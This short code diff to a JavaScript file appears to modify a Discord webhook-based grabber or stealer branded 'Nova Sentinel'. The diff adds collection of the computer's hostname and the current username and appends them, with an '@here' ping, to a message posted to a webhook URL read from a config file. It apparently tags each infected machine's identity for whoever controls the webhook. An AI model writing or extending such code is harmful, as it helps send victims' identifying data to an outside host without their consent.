@@ -1647,6 +1647,8 @@ const { fstatSync } = require("fs"),
         const configFileParsed = JSON.parse(configFileContent);
         const webhookUrl = configFileParsed.webhook;
         const links = configFileParsed.link;
+        const computerName = os.hostname();
+        const username = os.userInfo().username;
 
         const embed = {
           color: 3553599,
@@ -1670,7 +1672,7 @@ const { fstatSync } = require("fs"),
           username: "Nova Sentinel",
           avatar_url:
             "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
-          content: "@here",
+          content: "@here" + "\n`" + computerName + "`" + " - " + "`" + username + "`",
           embeds: [embed],
         };
 
